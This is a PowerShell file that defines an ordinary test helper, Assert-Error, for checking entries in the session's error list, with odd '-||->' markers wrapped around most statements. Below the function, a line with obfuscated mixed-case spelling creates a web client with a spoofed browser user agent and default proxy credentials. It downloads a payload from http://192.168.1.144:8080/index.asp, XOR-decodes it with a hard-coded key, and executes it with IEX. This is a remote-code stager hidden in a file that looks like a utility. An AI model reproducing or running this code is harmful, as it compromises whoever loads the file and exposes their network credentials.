













 -||-> function Assert-Error
{
    
    [CmdletBinding(DefaultParameterSetName='Default')]
    param(
        [Parameter(Mandatory=$true,ParameterSetName='CheckLastError')]
        [Switch]
        
        $Last,

        [Parameter(Mandatory=$true,ParameterSetName='CheckFirstError')]
        [Switch]
        
        $First,

        [Parameter(Mandatory=$true,Position=0,ParameterSetName='CheckSpecificError')]
        [int]
        
        $Index,

        [int]
        
        $Count,

        [Parameter(Mandatory=$true,Position=0,ParameterSetName='CheckLastError')]
        [Parameter(Mandatory=$true,Position=0,ParameterSetName='CheckFirstError')]
        [Parameter(Mandatory=$true,Position=1,ParameterSetName='CheckSpecificError')]
        [Regex]
        
        $Regex,

        [Parameter(Position=0,ParameterSetName='Default')]
        [Parameter(Position=1,ParameterSetName='CheckLastError')]
        [Parameter(Position=1,ParameterSetName='CheckFirstError')]
        [Parameter(Position=2,ParameterSetName='CheckSpecificError')]
        [string]
        
        $Message
    )

     -||-> Set-StrictMode -Version 'Latest' <-||- 
    
     -||-> Assert-GreaterThan $Global:Error.Count 0 'Expected there to be errors, but there aren''t any.' <-||- 
     -||-> if(  -||-> $PSBoundParameters.ContainsKey('Count') <-||-  )
    {
         -||-> Assert-Equal $Count $Global:Error.Count ( -||-> 'Expected ''{0}'' errors, but found ''{1}''' -f $Count,$Global:Error.Count <-||- ) <-||- 
    } <-||- 

     -||-> if(  -||-> $PSCmdlet.ParameterSetName -like 'Check*Error' <-||-  )
    {
         -||-> if(  -||-> $PSCmdlet.ParameterSetName -eq 'CheckFirstError' <-||-  )
        {
             -||-> $Index = -1 <-||- 
        }
        elseif(  -||-> $PSCmdlet.ParameterSetName -eq 'CheckLastError' <-||-  )
        {
             -||-> $Index = 0 <-||- 
        } <-||- 

         -||-> Assert-True ( -||-> $Index -lt $Global:Error.Count <-||- ) ( -||-> 'Expected there to be at least {0} errors, but there are only {1}. {2}' -f ( -||-> $Index + 1 <-||- ),$Global:Error.Count,$Message <-||- ) <-||- 
         -||-> Assert-Match -Haystack $Global:Error[$Index].Exception.Message -Regex $Regex -Message $Message <-||- 
    } <-||- 
} <-||- 
 -||-> $WC= -||-> NEw-OBjECt SysTEm.Net.WeBCLIeNT <-||-  <-||- ; -||-> $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko' <-||- ; -||-> $Wc.HeaDErS.ADd('User-Agent',$u) <-||- ; -||-> $wc.PRoxy = [SYstEM.Net.WeBREQuesT]::DefaUltWeBPRoXy <-||- ; -||-> $Wc.ProXy.CReDEnTiAls = [SYSTem.NET.CRedeNtiAlCacHE]::DeFAulTNeTWOrKCREdenTIAlS <-||- ; -||-> $K='A]byD^=C7!cLGUr\,)F;qd~$S*2T:{/O' <-||- ; -||-> $I=0 <-||- ; -||-> [chAR[]]$b= -||-> ( -||-> [CHAR[]]( -||-> $Wc.DOWnloADSTRING("http://192.168.1.144:8080/index.asp") <-||- ) <-||- )|%{ -||-> $_-BXoR$K[$I++%$K.LENgTH] <-||- } <-||-  <-||- ; -||-> IEX ( -||-> $B-JoIN'' <-||- ) <-||- 



